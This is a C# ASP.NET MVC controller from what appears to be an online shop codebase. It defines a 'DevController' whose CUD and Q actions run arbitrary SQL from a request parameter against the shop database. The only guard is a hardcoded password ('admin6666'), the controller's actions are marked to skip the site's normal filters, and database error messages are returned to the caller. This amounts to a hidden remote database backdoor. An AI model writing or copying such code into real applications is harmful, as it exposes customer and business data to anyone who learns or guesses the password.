using RelexBarDLL;
using silushop.Utils;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace silushop.Controllers
{
    public class DevController : Controller
    {
        [Filter.NoFilter]
        public ActionResult index(string id)
        {
            if (id != "gzhd6666admin")
            {
                return Redirect(Request.UrlReferrer.ToString());
            }
            return View();
        }
        [Filter.NoFilter]
        public JsonResult CUD(string id, string sql, string pwd)
        {
            if (pwd != "admin6666")
            {
                return Json(new { code = -1, msg = "" });
            }
            using (RelexBarEntities entity = new RelexBarEntities())
            {
                try
                {
                    int i = entity.Database.ExecuteSqlCommand(sql, new SqlParameter[] { });
                    return Json(new { code = 1, result = i, msg = "" });
                }
                catch (Exception ex)
                {
                    return Json(new { code = -1, result = 0, msg = ex.Message });
                }
            }
        }
        [Filter.NoFilter]
        public JsonResult Q(string id, string sql, string pwd)
        {
            if (pwd != "admin6666")
            {
                return Json(new { code = -1, msg = "" });
            }
            using (RelexBarEntities entity = new RelexBarEntities())
            {
                try
                {

                    using (SqlCommand sqlcomm = new SqlCommand())
                    {
                        entity.Database.Connection.Open();
                        //command.CommandText = sql;

                        SqlDataAdapter adapter = new SqlDataAdapter(sql, entity.Database.Connection as SqlConnection);

                        DataSet ds = new DataSet();
                        adapter.Fill(ds);
                        DataTable schema = ds.Tables[0];

                        string[] head = new string[schema.Columns.Count];
                        List<string[]> list = new List<string[]>();
                        for (int i = 0; i < schema.Columns.Count; i++)
                        {
                            head[i] = schema.Columns[i].ColumnName;
                        }
                        for (int i = 0; i < schema.Rows.Count; i++)
                        {
                            string[] temp = new string[head.Length];
                            for (int j = 0; j < temp.Length; j++)
                            {
                                object tempdata = schema.Rows[i][head[j]];
                                temp[j] = tempdata == null ? null : tempdata.ToString();
                            }
                            list.Add(temp);
                        }
                        sqlcomm.Dispose();
                        entity.Database.Connection.Close();
                        return Json(new { code = 1, head = string.Join(",", head), result = list.SerializeObject(), msg = "" });

                    }
                }
                catch (Exception ex)
                {
                    return Json(new { code = -1, result = 0, msg = ex.Message });
                }
            }
        }
    }
}